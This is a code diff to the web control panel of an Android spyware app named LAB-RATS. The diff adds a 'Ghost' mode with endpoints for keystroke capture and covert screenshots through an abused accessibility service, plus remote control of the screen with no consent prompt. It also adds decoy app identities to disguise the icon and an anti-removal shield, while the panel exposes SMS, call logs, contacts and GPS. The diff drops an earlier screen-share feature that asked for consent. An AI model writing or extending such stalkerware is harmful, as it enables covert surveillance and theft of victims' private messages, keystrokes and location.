@@ -17,6 +17,7 @@ import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.telephony.SmsManager;
 import android.util.Log;
+import android.accessibilityservice.AccessibilityService;
 import androidx.core.content.ContextCompat;
 import java.io.BufferedReader;
 import java.io.InputStream;
@@ -213,6 +214,11 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  box-shadow: 0 20px 50px rgba(0,0,0,0.4), inset 0 1px 1px rgba(255,255,255,0.05);" +
             "  position: relative;" +
             "}" +
+            ".card-keylogger {" +
+            "  border: 1px solid var(--neon-cyan) !important;" +
+            "  box-shadow: 0 0 20px rgba(0, 242, 255, 0.2) !important;" +
+            "  background: rgba(0, 242, 255, 0.02) !important;" +
+            "}" +
             ".card-node {" +
             "  padding: 30px 20px;" +
             "  border-radius: 12px;" +
@@ -278,6 +284,9 @@ public class LabRatsHttpServer extends NanoHTTPD {
             ".btn-small { padding: 6px 15px; font-size: 0.65rem; border-radius: 12px; min-width: 0; width: auto; }" +
             ".empty-state { text-align: center; padding: 60px 20px; }" +
             ".empty-state .icon { font-size: 4rem; margin-bottom: 20px; opacity: 0.2; color: var(--neon-cyan); }" +
+            ".card-keylogger { border: 2px solid var(--neon-cyan) !important; box-shadow: 0 0 20px rgba(0, 242, 255, 0.4) !important; background: rgba(0, 242, 255, 0.05) !important; display: block !important; opacity: 1 !important; visibility: visible !important; }" +
+            ".terminal-text { font-family: 'JetBrains Mono', monospace; color: var(--neon-cyan); background: #000; padding: 15px; border-radius: 8px; border: 1px solid rgba(0, 242, 255, 0.2); box-shadow: inset 0 0 20px rgba(0,0,0,0.8); }" +
+            ".watermark { position: absolute; top: 50%; left: 20px; transform: translateY(-50%); height: 42px; width: 42px; z-index: 10; pointer-events: none; object-fit: contain; }" +
             
             // --- MOBILE_OPTIMIZATION_PROTOCOL ---
             "@media (max-width: 768px) {" +
@@ -290,7 +299,9 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  .glitch { font-size: 0.47rem; letter-spacing: 1px; }" +
             "  .nav { gap: 4px; justify-content: center; width: 100%; padding: 0 4px; box-sizing: border-box; }" +
             "  .nav a { padding: 10px 1px; font-size: 0.6rem; border-radius: 12px; flex: 1 1 calc(33.33% - 6px); text-align: center; letter-spacing: 0; min-width: 0; font-weight: normal; }" +
-            "  .card { padding: 15px; margin-bottom: 12px; border-radius: 10px; width: 100%; box-sizing: border-box; overflow: hidden; }" +
+            "  .card { padding: 15px; margin-bottom: 12px; border-radius: 10px; width: 100%; box-sizing: border-box; overflow: hidden; border: 1px solid rgba(255,255,255,0.05); }" +
+            "  .card-keylogger { border: 2px solid var(--neon-cyan) !important; box-shadow: 0 0 25px rgba(0, 242, 255, 0.5) !important; background: rgba(0, 242, 255, 0.1) !important; position: relative; z-index: 100; display: block !important; visibility: visible !important; }" +
+            "  .card-keylogger::after { content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; border-radius: 10px; pointer-events: none; box-shadow: inset 0 0 10px rgba(0, 242, 255, 0.1); }" +
             "  .info-grid { grid-template-columns: 1fr !important; gap: 8px; }" +
             "  .info-item { padding: 12px; }" +
             "  #log-terminal { height: 260px !important; font-size: 0.65rem !important; padding: 10px !important; }" +
@@ -298,7 +309,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  button:not(.btn-small), .btn:not(.btn-small) { width: 100% !important; min-width: 0 !important; text-align: center; padding: 14px 10px !important; margin-bottom: 8px; border-radius: 12px; display: block !important; font-size: 0.75rem !important; white-space: nowrap !important; }" +
             "  .btn-small { width: auto !important; min-width: 0 !important; display: inline-block !important; padding: 4px 8px !important; font-size: 0.6rem !important; letter-spacing: 0 !important; border-radius: 12px !important; margin-bottom: 5px !important; }" +
             "  .btn-back { width: 100%; justify-content: center; padding: 10px; font-size: 0.7rem; border-radius: 12px; }" +
-            "  .watermark { opacity: 1.0 !important; height: 63px !important; top: 25px !important; left: -9px !important; transform: none !important; z-index: 0; }" +
+            "  .watermark { height: 40px !important; width: 40px !important; top: 10px !important; left: 10px !important; transform: none !important; z-index: 10; }" +
             "  .intel-status { font-size: 0.55rem !important; white-space: nowrap !important; }" +
             "  table { display: block; overflow-x: auto; width: 100%; -webkit-overflow-scrolling: touch; }" +
             "  th, td { padding: 10px 8px; font-size: 0.65rem; }" +
@@ -306,7 +317,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  h3 { font-size: 0.85rem !important; }" +
             "  .info-section { margin-top: 15px; }" +
             "  .file-item { padding: 10px; gap: 8px; }" +
-            "  .file-item .btn-small { padding: 4px 10px !important; font-size: 0.55rem !important; margin: 0 !important; }" +
+            "  .file-item .btn-small { padding: 4px 10px !important; font-size: 0.55rem !important; margin: 0 !important; width: auto !important; min-width: 0 !important; display: inline-block !important; }" +
             "  .file-info { min-width: 0; }" +
             "  .file-name { font-size: 0.8rem; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }" +
             "  .file-icon { margin-right: 10px; width: 25px; font-size: 1.1rem; }" +
@@ -331,13 +342,13 @@ public class LabRatsHttpServer extends NanoHTTPD {
             ".back-btn-container { margin-bottom: 25px; }" +
             ".btn-back { display: inline-flex; align-items: center; gap: 8px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); padding: 8px 16px; text-decoration: none; border-radius: 12px; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; transition: all 0.3s; }" +
             ".btn-back:hover { background: var(--neon-cyan); color: var(--bg-dark); box-shadow: 0 0 15px var(--neon-cyan); }" +
-            ".watermark { position: absolute; top: 50%; left: 20px; transform: translateY(-50%); height: 65%; width: auto; z-index: 10000; opacity: 1.0; pointer-events: none; }" +
+            "" +
             "</style>" +
             "</head>" +
             "<body>" +
             "<div class=\"container\">" +
             "  <div class=\"header\">" +
-            "    <img src=\"/logo?v=134\" class=\"watermark\" alt=\"LAB-RATS\" loading=\"eager\">" +
+            "    <img src=\"/logo\" class=\"watermark\" alt=\"LAB-RATS\" width=\"42\" height=\"42\">" +
             "    <div class=\"title-font\">LAB-RATS</div>" +
             "    <div class=\"glitch-container\">" +
             "      <div class=\"glitch\" data-text=\"DEVELOPED BY K4N3CO.LABS\">DEVELOPED BY K4N3CO.LABS</div>" +
@@ -346,16 +357,17 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  </div>" +
             "  <div class=\"nav\">" +
             "    <a href=\"/\">Terminal</a>" +
-            "    <a href=\"/device\">Hardware</a>" +
-            "    <a href=\"/files\">Data</a>" +
+            "    <a href=\"/ghost\">Ghost</a>" +
             "    <a href=\"/camera\">Optics</a>" +
             "    <a href=\"/gps\">Locate</a>" +
+            "    <a href=\"/files\">Data</a>" +
             "    <a href=\"/intel\">Intel</a>" +
-            "    <a href=\"/calls\">Comms</a>" +
             "    <a href=\"/sms\">SMS</a>" +
             "    <a href=\"/mms\">MMS</a>" +
             "    <a href=\"/audio\">Acoustics</a>" +
+            "    <a href=\"/calls\">Comms</a>" +
             "    <a href=\"/contacts\">Contacts</a>" +
+            "    <a href=\"/device\">Hardware</a>" +
             "  </div>";
 
     private static final String HTML_FOOTER = "</div>" +
@@ -612,10 +624,6 @@ public class LabRatsHttpServer extends NanoHTTPD {
                             array.put(log);
                         }
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", array.toString());
-                    } else if (uri.equals("/camera/screen-frame")) {
-                        response = serveScreenFrame();
-                    } else if (uri.equals("/camera/screen-start")) {
-                        response = startScreenProjection();
                     } else if (uri.equals("/gps")) {
                         response = serveGpsPage();
                     } else if (uri.equals("/gps/locate")) {
@@ -633,7 +641,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
                     } else if (uri.equals("/camera/night-mode")) {
                         response = toggleNightMode();
                     } else if (uri.equals("/stealth")) {
-                        response = toggleStealthMode();
+                        response = toggleStealthMode(params);
                     } else if (uri.equals("/settings/password")) {
                         response = updatePassword(session);
                     } else if (uri.startsWith("/download/")) {
@@ -654,6 +662,20 @@ public class LabRatsHttpServer extends NanoHTTPD {
                         response = updateAudioSettings(params);
                     } else if (uri.equals("/audio/recordings")) {
                         response = serveAudioRecordings();
+                    } else if (uri.equals("/ghost")) {
+                        response = serveGhostPage();
+                    } else if (uri.equals("/ghost/keys")) {
+                        response = serveKeystrokes();
+                    } else if (uri.equals("/ghost/clear")) {
+                        GhostService.clearKeystrokes();
+                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+                    } else if (uri.equals("/ghost/screenshot")) {
+                        response = serveCovertScreenshot();
+                    } else if (uri.equals("/ghost/status")) {
+                        boolean active = GhostService.getInstance() != null;
+                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"active\": " + active + "}");
+                    } else if (uri.equals("/ghost/interact")) {
+                        response = performInteraction(params);
                     } else {
                         response = serve404();
                     }
@@ -663,8 +685,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
             response = serveError(e.getMessage());
         }
 
-        // Global Anti-Cache Lockdown
-        if (response != null) {
+        // Global Anti-Cache Lockdown (Exclude assets to prevent flickering)
+        if (response != null && !uri.equals("/logo") && !uri.startsWith("/font/")) {
             response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
             response.addHeader("Pragma", "no-cache");
             response.addHeader("Expires", "0");
@@ -818,25 +840,6 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"margin-bottom: 20px;\">Device Information</h2>");
         html.append(DeviceInfo.getDeviceInfoHtml(context));
-        html.append("</div>");
-        
-        html.append("<div class=\"card\" style=\"border-color: var(--neon-orange);\">");
-        html.append("<h2 style=\"color: var(--neon-orange);\">STEALTH_OPERATIONS</h2>");
-        html.append("<p style=\"color: #888; margin-bottom: 20px;\">Manage advanced app camouflage. <b>Masquerade Mode</b> replaces the app identity with a generic 'System Update' gear. When active, opening the app launches a <b>fully functional decoy update screen</b> that adapts to system light/dark themes. All background notifications are also hijacked for total stealth. Use dial code <b>*#1337#</b> or rapidly tap the gear icon 10 times to restore access.</p>");
-        
-        html.append("<div style=\"display: flex; gap: 15px;\">");
-        html.append("<button onclick=\"toggleStealth()\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255, 157, 0, 0.05);\">TOGGLE_MASQUERADE_MODE</button>");
-        html.append("</div>");
-        
-        html.append("<script>");
-        html.append("function toggleStealth() {");
-        html.append("  if(confirm('Initiate Stealth Protocol? This will change the app icon to System Update.')) {");
-        html.append("    fetch('/stealth').then(r => r.json()).then(d => {");
-        html.append("      alert(d.mode === 'masquerade' ? 'MASQUERADE_ACTIVE: Icon replaced with System Update.' : 'STEALTH_DISENGAGED: Main icon restored.');");
-        html.append("    });");
-        html.append("  }");
-        html.append("}");
-        html.append("</script>");
         html.append("</div>");
 
         html.append(HTML_FOOTER);
@@ -1498,6 +1501,21 @@ public class LabRatsHttpServer extends NanoHTTPD {
             if (location != null) {
                 double lat = location.getLatitude();
                 double lon = location.getLongitude();
+                
+                // --- UPDATE DECOY CITY ---
+                try {
+                    android.location.Geocoder geocoder = new android.location.Geocoder(context, Locale.getDefault());
+                    List<android.location.Address> addresses = geocoder.getFromLocation(lat, lon, 1);
+                    if (addresses != null && !addresses.isEmpty()) {
+                        String city = addresses.get(0).getLocality();
+                        if (city != null) {
+                            context.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE)
+                                .edit().putString("last_city", city).apply();
+                        }
+                    }
+                } catch (Exception e) {
+                    Log.e("LabRATS", "Geocoder failed: " + e.getMessage());
+                }
 
                 if (params.containsKey("json")) {
                     String json = String.format(Locale.US, "{\"success\": true, \"lat\": %f, \"lon\": %f, \"provider\": \"%s\", \"accuracy\": %f, \"time\": %d}",
@@ -1781,39 +1799,6 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
             html.append("</div>");
 
-            // Screen Projection Section
-            html.append("<div class=\"info-section\" style=\"margin-top: 15px;\">");
-            html.append("<h3 style=\"color: var(--neon-cyan); margin-bottom: 15px;\">&#128241; Remote Screen Projection</h3>");
-            html.append("<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">Stream the live device screen (Requires user consent on phone)</p>");
-            
-            html.append("<div style=\"text-align: center; margin-bottom: 25px;\">");
-            html.append("<div id=\"screen-container\" style=\"position: relative; display: block; margin: 0 auto; background: #000; border: 1px solid var(--neon-cyan); border-radius: 12px; overflow: hidden; min-height: 180px; width: 100%; max-width: 360px;\">");
-            html.append("<img id=\"screen-stream\" src=\"\" style=\"max-width: 100%; height: auto; display: block; margin: 0 auto;\" />");
-            html.append("<div id=\"screen-status\" style=\"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #888; font-size: 0.8rem;\">OFFLINE</div>");
-            html.append("</div></div>");
-            html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
-            html.append("<button onclick=\"startScreen()\" class=\"btn\">START_PROJECTION</button>");
-            html.append("<button onclick=\"stopScreen()\" class=\"btn\" style=\"border-color: var(--danger); color: var(--danger);\">STOP</button>");
-            html.append("</div>");
-
-            html.append("<script>");
-            html.append("var screenActive = false;");
-            html.append("function startScreen() {");
-            html.append("  fetch('/camera/screen-start').then(r => r.json()).then(d => {");
-            html.append("    screenActive = true; document.getElementById('screen-status').innerHTML = 'WAITING_FOR_CONSENT...';");
-            html.append("    refreshScreen();");
-            html.append("  });");
-            html.append("}");
-            html.append("function stopScreen() { screenActive = false; document.getElementById('screen-status').innerHTML = 'OFFLINE'; document.getElementById('screen-stream').src = ''; }");
-            html.append("function refreshScreen() {");
-            html.append("  if (!screenActive) return;");
-            html.append("  const img = document.getElementById('screen-stream');");
-            html.append("  img.src = '/camera/screen-frame?t=' + Date.now();");
-            html.append("  img.onload = () => { document.getElementById('screen-status').style.display = 'none'; };");
-            html.append("  setTimeout(refreshScreen, 1000);");
-            html.append("}");
-            html.append("</script>");
-            html.append("</div>");
         }
 
         html.append("</div>");
@@ -2411,36 +2396,10 @@ public class LabRatsHttpServer extends NanoHTTPD {
         String videoPath = CameraService.getCurrentVideoPath();
 
         String json = String.format(
-                "{\"streaming\": %s, \"recording\": %s, \"camera\": \"%s\", \"duration\": %d, \"videoPath\": %s, \"screenShare\": %s}",
+                "{\"streaming\": %s, \"recording\": %s, \"camera\": \"%s\", \"duration\": %d, \"videoPath\": %s}",
                 streaming, recording, currentCamera, duration,
-                videoPath != null ? "\"" + videoPath + "\"" : "null",
-                ScreenShareService.isStreaming());
+                videoPath != null ? "\"" + videoPath + "\"" : "null");
         return newFixedLengthResponse(Response.Status.OK, "application/json", json);
-    }
-
-    private Response serveScreenFrame() {
-        byte[] frame = ScreenShareService.getNextFrame();
-        if (frame != null && frame.length > 0) {
-            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(frame);
-            Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, frame.length);
-            response.addHeader("Cache-Control", "no-cache");
-            return response;
-        }
-        // If no frame is available, return 204 No Content to prevent broken image icons
-        return newFixedLengthResponse(Response.Status.NO_CONTENT, "image/jpeg", "");
-    }
-
-    private Response startScreenProjection() {
-        try {
-            logActivity("PROJECTION_UPLINK: Screen share protocol initiated");
-            Intent intent = new Intent(context, MainActivity.class);
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            intent.putExtra("trigger", "screen_capture");
-            context.startActivity(intent);
-            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"Consent prompt sent to device\"}");
-        } catch (Exception e) {
-            return serveError("Projection Error: " + e.getMessage());
-        }
     }
 
     // ============ AUDIO/MICROPHONE RECORDING ============
@@ -3207,7 +3166,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("</div>");
         html.append("<h2 style=\"display:flex; align-items:center; gap:15px; margin-bottom:20px; flex-wrap: wrap;\">")
             .append("<span style=\"color:var(--neon-cyan);\">&#9889;</span> INTEL_STREAM")
-            .append("<div style=\"margin-left:auto; display:flex; align-items:center; gap:10px; flex-wrap: wrap; justify-content: flex-end;\">")
+            .append("<div class=\"header-actions\" style=\"margin-left:auto; display:flex; align-items:center; gap:10px; flex-wrap: wrap; justify-content: flex-start;\">")
             .append("<button onclick=\"clearIntel()\" class=\"btn btn-small\" style=\"border-radius: 12px; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); margin-bottom: 0;\">CLEAR_STREAM</button>")
             .append("<button onclick=\"location.reload()\" class=\"btn btn-small\" style=\"border-radius: 12px; border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); margin-bottom: 0;\">RELOAD_STREAM</button>")
             .append("<span style=\"font-size:0.6rem; opacity:0.5; font-family:monospace; white-space: nowrap;\">LISTENER_ACTIVE</span>")
@@ -3372,24 +3331,44 @@ public class LabRatsHttpServer extends NanoHTTPD {
         return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"nightMode\": " + newValue + "}");
     }
 
-    private Response toggleStealthMode() {
+    private Response toggleStealthMode(Map<String, String> params) {
         try {
+            String type = params.get("type");
+            if (type == null) type = "update";
+
             android.content.pm.PackageManager pm = context.getPackageManager();
             android.content.ComponentName mainAlias = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
-            android.content.ComponentName fakeAlias = new android.content.ComponentName(context, "com.labs.labrats.SystemUpdateAlias");
+            
+            // Library of component aliases
+            android.content.ComponentName updateAlias = new android.content.ComponentName(context, "com.labs.labrats.SystemUpdateAlias");
+            android.content.ComponentName calcAlias = new android.content.ComponentName(context, "com.labs.labrats.CalculatorAlias");
+            android.content.ComponentName weatherAlias = new android.content.ComponentName(context, "com.labs.labrats.WeatherAlias");
+            android.content.ComponentName settingsAlias = new android.content.ComponentName(context, "com.labs.labrats.SettingsAlias");
+            
+            android.content.ComponentName targetAlias;
+            switch(type) {
+                case "calc": targetAlias = calcAlias; break;
+                case "weather": targetAlias = weatherAlias; break;
+                case "settings": targetAlias = settingsAlias; break;
+                default: targetAlias = updateAlias; break;
+            }
             
             int mainState = pm.getComponentEnabledSetting(mainAlias);
+            boolean forceRestore = "restore".equals(params.get("action"));
             
-            if (mainState != android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
-                // Switch to Fake Icon
-                logActivity("STEALTH_EXECUTION: Masquerade Mode ENABLED");
+            if (!forceRestore && mainState != android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
+                // Switch to Fake Icon from Library
+                logActivity("STEALTH_EXECUTION: Stealth Mode ENABLED (" + type + ")");
                 pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-                pm.setComponentEnabledSetting(fakeAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"mode\": \"masquerade\", \"hidden\": true}");
+                pm.setComponentEnabledSetting(targetAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"mode\": \"stealth\", \"type\": \"" + type + "\", \"hidden\": true}");
             } else {
-                // Restore Main Icon
-                logActivity("STEALTH_EXECUTION: Masquerade Mode DISABLED");
-                pm.setComponentEnabledSetting(fakeAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                // Restore Main Icon and disable ALL decoys
+                logActivity("STEALTH_EXECUTION: Stealth Mode DISABLED");
+                pm.setComponentEnabledSetting(updateAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                pm.setComponentEnabledSetting(calcAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                pm.setComponentEnabledSetting(weatherAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                pm.setComponentEnabledSetting(settingsAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                 pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                 return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"mode\": \"normal\", \"hidden\": false}");
             }
@@ -3426,5 +3405,339 @@ public class LabRatsHttpServer extends NanoHTTPD {
     private String getStoredPassword() {
         return context.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE)
                 .getString("c2_password", "admin1337");
+    }
+
+    private Response serveCovertScreenshot() {
+        GhostService ghost = GhostService.getInstance();
+        if (ghost == null) return serveError("Ghost Service Offline");
+
+        final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
+        final byte[][] result = new byte[1][];
+        final String[] error = new String[1];
+
+        ghost.takeCovertScreenshot(new GhostService.ScreenshotCallback() {
+            @Override
+            public void onSuccess(byte[] jpegData) {
+                result[0] = jpegData;
+                latch.countDown();
+            }
+
+            @Override
+            public void onFailure(String err) {
+                error[0] = err;
+                latch.countDown();
+            }
+        });
+
+        try {
+            if (latch.await(3, java.util.concurrent.TimeUnit.SECONDS)) { // Reduced timeout for speed
+                if (result[0] != null) {
+                    return newFixedLengthResponse(Response.Status.OK, "image/jpeg", new java.io.ByteArrayInputStream(result[0]), result[0].length);
+                } else {
+                    return serveError("Screenshot Failed: " + error[0]);
+                }
+            } else {
+                return serveError("Screenshot Timeout");
+            }
+        } catch (Exception e) {
+            return serveError("Internal Error: " + e.getMessage());
+        }
+    }
+
+    private Response serveGhostPage() {
+        StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"back-btn-container\">");
+        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("</div>");
+        
+        html.append("<div class=\"card\">");
+        html.append("<h2 style=\"display:flex; align-items:center; gap:15px; margin-bottom:20px;\">")
+            .append("<span style=\"color:var(--neon-cyan);\">&#128123;</span> GHOST_CONTROLLER")
+            .append("</h2>");
+
+        boolean isActive = GhostService.getInstance() != null;
+        html.append("<div id=\"ghost-status-card\" class=\"status-card\" style=\"padding:20px; background:rgba(255,255,255,0.05); border-radius:12px; margin-bottom:25px; border:1px solid ").append(isActive ? "var(--neon-green)" : "var(--danger)").append(";\">");
+        html.append("<div class=\"info-label\">GHOST_MODE_STATUS</div>");
+        html.append("<div id=\"ghost-status-text\" style=\"font-size:1.1rem; font-weight:bold;\">")
+            .append(isActive ? "<span style=\"color:var(--neon-green);\">UPLINK_ESTABLISHED</span>" : "<span style=\"color:var(--danger);\">OFFLINE_AWAITING_PERMISSION</span>")
+            .append("</div>");
+        
+        html.append("<div id=\"accessibility-prompt\" style=\"display: ").append(isActive ? "none" : "block").append(";\">");
+        html.append("<p style=\"color:#888; font-size:0.8rem; margin-top:10px;\">Ghost Mode requires <b>Accessibility Permission</b>. Instruct the user to enable 'System Stability Service' in Accessibility settings.</p>");
+        html.append("<button onclick=\"openSettings()\" class=\"btn\" style=\"margin-top:15px;\">OPEN_ACCESSIBILITY_SETTINGS</button>");
+        html.append("</div>");
+        html.append("</div>");
+
+        // --- GHOST_UTILITIES_SECTION (Moved to Top) ---
+        html.append("<div class=\"card\" style=\"border-left: 5px solid var(--neon-green);\">");
+        html.append("<h2 style=\"color: var(--neon-green); margin-bottom: 15px;\">GHOST_UTILITIES</h2>");
+        html.append("<div class=\"info-grid\">");
+        
+        html.append("<div class=\"info-item\">");
+        html.append("<div class=\"info-label\">BLACKOUT_PROTOCOL</div>");
+        html.append("<p style=\"color:#888; font-size:0.75rem; margin-top:5px; margin-bottom:10px;\">Suppresses hardware backlight and hides system bars. <b>Note:</b> Remote feed will also be black while active.</p>");
+        html.append("<div style=\"display:flex; gap:10px;\">");
+        html.append("<button onclick=\"ghostAction('blackout_on')\" class=\"btn btn-small\" style=\"border-color: #fff; color: #fff;\">ACTIVATE</button>");
+        html.append("<button onclick=\"ghostAction('blackout_off')\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\">RESTORE</button>");
+        html.append("</div></div>");
+
+        html.append("<div class=\"info-item\">");
+        html.append("<div class=\"info-label\">SELF_HEALING</div>");
+        html.append("<p style=\"color:#888; font-size:0.75rem; margin-top:5px; margin-bottom:10px;\">Forces open system permissions. The Anti-Removal shield is automatically paused for 10 seconds.</p>");
+        html.append("<button onclick=\"ghostAction('autoheal')\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green);\">INITIATE_AUTO_HEAL</button>");
+        html.append("</div>");
+        
+        html.append("</div></div>");
+
+        // Stealth Operations Section
+        html.append("<div class=\"card\" style=\"border-color: var(--neon-orange);\">");
+        html.append("<h2 style=\"color: var(--neon-orange);\">STEALTH_OPERATIONS</h2>");
+        html.append("<p style=\"color: #888; margin-bottom: 20px;\">Manage advanced app camouflage. Choose an identity from the library. Each identity includes a <b>fully functional decoy interface</b>. Use dial pad code <b>*#1337#</b> or find the hidden 10-tap backdoor to restore access.</p>");
+        
+        html.append("<div style=\"margin-bottom: 15px;\">");
+        html.append("<label class=\"info-label\">MASQUERADE_IDENTITY:</label>");
+        html.append("<select id=\"stealth-type\" style=\"width:100%; background:#000; border:1px solid var(--neon-orange); color:#fff; padding:10px; border-radius:8px; outline:none; font-family:monospace; margin-top:5px;\">");
+        html.append("<option value=\"update\">System Update (Status Gear)</option>");
+        html.append("<option value=\"calc\">Calculator (Apple Style)</option>");
+        html.append("<option value=\"weather\">Weather (Blue Sky Forecast)</option>");
+        html.append("<option value=\"settings\">Settings (System Config)</option>");
+        html.append("</select>");
+        html.append("</div>");
+
+        html.append("<div style=\"display: flex; gap: 15px;\">");
+        html.append("<button onclick=\"toggleStealth()\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255, 157, 0, 0.05);\">INITIATE_STEALTH_MODE</button>");
+        html.append("<button onclick=\"restoreNormal()\" class=\"btn\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05);\">RESTORE_NORMAL_MODE</button>");
+        html.append("</div>");
+        html.append("</div>");
+
+        // Remote Interaction Section
+        html.append("<div class=\"info-section\">");
+        html.append("<h3>&#128433; COVERT_REMOTE_CONTROL</h3>");
+        html.append("<p style=\"color: #888; font-size: 0.85rem; margin-bottom: 20px;\">Real-time interaction using Accessibility Triangulation (No consent prompt required).</p>");
+        
+        // Screen View tool
+        html.append("<div style=\"text-align: center; margin-bottom: 25px;\">");
+        html.append("<div id=\"ghost-screen-container\" style=\"position: relative; display: block; margin: 0 auto; background: #000; border: 1px solid var(--neon-cyan); border-radius: 12px; overflow: hidden; min-height: 150px; width: 100%; max-width: 270px; cursor: crosshair;\">");
+        html.append("<img id=\"ghost-screen-stream\" src=\"\" style=\"max-width: 100%; height: auto; display: block; margin: 0 auto; user-select: none; -webkit-user-drag: none;\" onmousedown=\"startGhostDrag(event)\" onmouseup=\"endGhostDrag(event)\" />");
+        html.append("<div id=\"ghost-screen-status\" style=\"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #888; font-size: 0.8rem;\">COVERT_FEED_STANDBY</div>");
+        html.append("</div></div>");
+
+        html.append("<div class=\"info-grid\">");
+        
+        // Manual Click/Swipe
+        html.append("<div class=\"info-item\">");
+        html.append("<div class=\"info-label\">UPLINK_PROTOCOL</div>");
+        html.append("<div style=\"display:flex; gap:10px; margin-top:10px;\">");
+        html.append("<button id=\"ghost-start-btn\" onclick=\"startGhostScreen()\" class=\"btn btn-small\" style=\"margin:0; border-radius: 30px;\">INITIATE_VIEW</button>");
+        html.append("<button id=\"ghost-stop-btn\" onclick=\"stopGhostScreen()\" class=\"btn btn-small\" style=\"margin:0; border-radius: 30px; border-color:var(--danger); color:var(--danger); display:none;\">TERMINATE</button>");
+        html.append("</div></div>");
+
+        // Global Actions
+        html.append("<div class=\"info-item\">");
+        html.append("<div class=\"info-label\">SYSTEM_GESTURES</div>");
+        html.append("<div style=\"display:flex; flex-wrap:wrap; gap:5px; margin-top:10px;\">");
+        html.append("<button onclick=\"ghostAction('recents')\" class=\"btn btn-small\" style=\"margin:0; border-radius: 30px; border-color: #9b59b6; color: #9b59b6;\">RECENTS</button>");
+        html.append("<button onclick=\"ghostAction('home')\" class=\"btn btn-small\" style=\"margin:0; border-radius: 30px;\">HOME</button>");
+        html.append("<button onclick=\"ghostAction('back')\" class=\"btn btn-small\" style=\"margin:0; border-radius: 30px; border-color: #f39c12; color: #f39c12;\">BACK</button>");
+        html.append("</div></div>");
+
+        html.append("</div></div>");
+
+        // Deep Intel / Keylogs Section
+        html.append("<div id=\"keylogger-box\" class=\"card card-keylogger\" style=\"margin-top: 30px; display: block !important;\">");
+        html.append("<div style=\"display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;\">");
+        html.append("<h2 style=\"color:var(--neon-cyan); margin:0;\">&#9000; DEEP_INTEL_KEYLOGS</h2>");
+        html.append("<button onclick=\"clearGhostLogs()\" class=\"btn btn-small\" style=\"border-color:var(--danger); color:var(--danger); margin:0; border-radius: 30px;\">PURGE_LOGS</button>");
+        html.append("</div>");
+        html.append("<p style=\"color: #888; font-size: 0.8rem; margin-bottom:15px;\">Real-time interception of keystrokes and system text.</p>");
+        
